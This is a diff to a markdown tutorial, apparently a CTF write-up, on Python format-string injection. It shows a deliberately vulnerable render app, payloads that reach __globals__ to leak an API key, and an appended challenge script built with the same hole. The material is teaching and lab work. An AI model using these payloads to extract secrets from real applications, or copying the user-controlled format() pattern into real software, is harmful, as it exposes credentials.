@@ -71,6 +71,7 @@ $ ./sandbox.py
 Usage : python3 ./sandbox.py TEMPLATE CONTENT
 Source code :
 
+```
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
@@ -95,25 +96,33 @@ if __name__ == '__main__':
         a = API(config['API_KEY'])
         print(a.renderHTML(sys.argv[1], "Vuln web render App", sys.argv[2]))
 ( Download source )
-
+```
 Let’s try this app with a legitimate example :
 
 $ ./test.py "<p>{text}</p>" "Wow such string"
 <p>Wow such string</p>
 But format string are great in python ! You can access object properties directly in the format string. In the case of a class, this can be really useful to access a specific value in the class. For example the format string {person.username} would retreive the field username of the following “Person” class :
 
+```
 class Person(object):
     def __init__(self, username):
         super(Person, self).__init__()
         self.username = username
+```
+
 In our case, we can exploit this to access other attributes, such as __init__ :
 
 $ ./sandbox.py "<p>{text.__init__}</p>" "Wow such string"
 <p><method-wrapper '__init__' of str object at 0x7f8f10a3b9f0></p>
+ 
 But we can also use this to get the script global context, using __globals__ after __init__ :
-
+ 
+```
 $ ./sandbox.py "<p>{self.__init__.__globals__}</p>" "Wow such string"
 <p>{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1385ac5f40>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': './sandbox.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'config': {'API_KEY': '212817d980b9a03add91e5814d02'}, 'API': <class '__main__.API'>, 'a': <__main__.API object at 0x7f1385b31490>}</p>
+ ```
+ 
+ 
 Continuing like this we can access the API_KEY :
 
 $ ./sandbox.py "<p>{self.__init__.__globals__[config][API_KEY]}</p>" "Wow such string"
@@ -121,3 +130,40 @@ $ ./sandbox.py "<p>{self.__init__.__globals__[config][API_KEY]}</p>" "Wow such s
 Additional references
 https://docs.python.org/3/library/functions.html#format
 Lots of python format string examples : https://pyformat.info/
+ 
+########
+ 
+ CHAL
+ 
+~~~ 
+#!/usr/bin/env python3
+import secrets
+import sys
+
+SECRET = secrets.token_hex()
+
+class Sandbox:
+
+    def ask_age(self):
+        self.age = input("How old are you ? ")
+        self.width = input("How wide do you want the nice box to be ? ")
+
+    def ask_secret(self):
+        if input("What is the secret ? ") == SECRET:
+            print("You found the secret ! I thought this was impossible.")
+            sys.exit(0)
+        else:
+            print("Wrong secret")
+
+    def run(self):
+        for _ in range(100):
+            self.ask_age()
+            to_format = f"""
+Printing a {self.width}-character wide box:
+[Age: {{self.age:{self.width}}} ]"""
+            print(to_format.format(self=self))
+            self.ask_secret()
+        sys.exit(1)
+
+Sandbox().run()
+```
